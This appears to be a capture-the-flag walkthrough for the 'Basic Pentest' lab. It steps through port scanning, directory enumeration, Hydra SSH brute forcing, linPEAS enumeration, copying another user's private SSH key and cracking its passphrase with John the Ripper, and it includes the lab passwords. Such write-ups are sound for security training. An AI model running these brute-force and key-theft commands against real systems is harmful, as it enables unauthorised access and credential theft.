# Basic Pentest
Web App Testing and Privilege Escalation
---
## Nmap
Find open services on target IP
- ```nmap -sC -sV [target IP]```

![image](https://user-images.githubusercontent.com/84083756/226158417-5d0dc6cd-5463-4d84-b75f-eee2747e6498.png)

- Open ports of interest:
  - port 22/tcp ssh
  - port 80/tcp http

Take a closer look at port 80
- Search the IP address and port 80 in the browser

![image](https://user-images.githubusercontent.com/84083756/226158626-ae85350d-4338-4fae-815d-9f393b2dc04b.png)

- View the page source

![image](https://user-images.githubusercontent.com/84083756/226158728-01841d49-73cc-49ad-bba2-0283456055f9.png)
---
## Gobuster
Look for directories using Dirbuster/Gobuster
- ```gobuster dir -w /usr/shar/wordslist/dirbuster/directory=list-2.3-medium.txt -u http://[target IP]```

![image](https://user-images.githubusercontent.com/84083756/226159207-7f0a174c-f9f2-4579-ae29-0e11a9b61ebc.png)

- Check out the /development directory that was found

![image](https://user-images.githubusercontent.com/84083756/226159435-cff5dd8c-f5cb-4d30-967f-42a1603cd34c.png)

- Click through the directories, look for information and also view page source for each page.
- Notice hints about a version number, directory and a weak password in the snippets below
![image](https://user-images.githubusercontent.com/84083756/226335662-3ba157a4-53e0-452b-8bdb-52eb476bcd60.png)
![image](https://user-images.githubusercontent.com/84083756/226335762-7d41797b-9de3-4ffe-9e02-001b0ada4f33.png)
---
## Enum4linux
- Lets try brute forcing SMB
- `enum4linux -a [ip address] | tee enum4linux.log`
- Searching the results we can see two users: Kay and Jan
![image](https://user-images.githubusercontent.com/84083756/226337156-363c828c-9a4f-4a8f-b95d-c34460144aca.png)
---
## Hydra
- Now that we have a user name and we know SSH port 22 is open, let's brute force it using Hydra
- `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://[ip address]`
- We can see Hydra has found a password match for jan
![image](https://user-images.githubusercontent.com/84083756/226338571-99ea5bcf-1bff-41e6-a476-30b4d279e24a.png)
---
## LinPEAS
Use LinPEAS to find vectors for privilege escalation
- SSH into the machine using `ssh jan@[ip address]` using the password `armando` found by Hydra
- Let's enumerate using linPEAS
- First we need to copy the linPEAS executable to jan's machine
- On our own machine eexcute:
  * `scp /opt/PEAS/linPEAS/linPEAS.sh jan@[IP address]:/dev/smh`
- From jan's machine perform `cd /dev/smh/`
- Change the linPEAS file to executable using `chmod +x linPEAS.sh`
- Run linPEAS saving the output to a log file
  - `./linPEAS.sh | tee linlog.txt`
- Here we can see highlighted in red that user kay has a private ssh key stored

![image](https://user-images.githubusercontent.com/84083756/226342733-708242e0-77c0-4f68-ab2f-c1188aee3d05.png)

- Move to kay's home folder and copy the SSH key
  - `cd /home/kay/.ssh`
  - `cat` and copy the id_rsa file contents
  - paste to a new file `kay_rsa_id` on our own machine and change to read only using `chmod 600 kay_rsa_id`
---
## John the Ripper
- Attempting to ssh using kay's private key ```ssh -i kay_rsa_id kay@[IP address]` we can see it is password protected
- Let's use ssh2john to prepare a file for JohnTheRipper to work with
  - `/opt/john/ssh2john.py kay_rsa_id > forjohn.txt`
- Lets run JohnTheRipper 
  - `/opt/john/john forjohn.txt --wordlist /usr/share/wordlists/rockyou.txt`
- Password found!

![image](https://user-images.githubusercontent.com/84083756/226346423-accff2c6-2244-4856-a0d9-9fecd194d91c.png)

- Lets ssh to kays machine
  - `ssh -i kay_rsa_id kay@[IP address]` 
  - input password `beeswax`
- Now, use `cat pass.bak` to view the passwrod we are searching for!

